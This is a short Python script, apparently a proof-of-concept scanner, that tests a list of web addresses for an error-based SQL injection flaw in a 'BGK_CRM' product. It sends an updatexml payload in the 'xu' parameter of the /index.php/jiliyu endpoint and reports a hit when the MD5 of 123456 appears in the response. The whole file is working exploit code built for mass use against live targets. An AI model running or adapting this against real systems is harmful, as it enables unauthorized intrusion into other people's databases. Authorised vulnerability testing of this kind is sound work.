import requests
import urllib3
import string,random
from urllib.parse import urljoin,quote
import argparse
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=123&xu=and%201=(updatexml(1,concat(0x7e,(select%20md5(123456)),0x7e),1))")
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
    }
    try:
        response = requests.get(target, headers=headers, verify=False,proxies=proxies)
        if response.status_code == 500 and 'e10adc3949ba59abbe56e057f20f883' in response.text:
            print(f"\033[31mDiscovered:{url}: BGK_CRM_jiliyu_SQL injection!\033[0m")
            return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt

    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")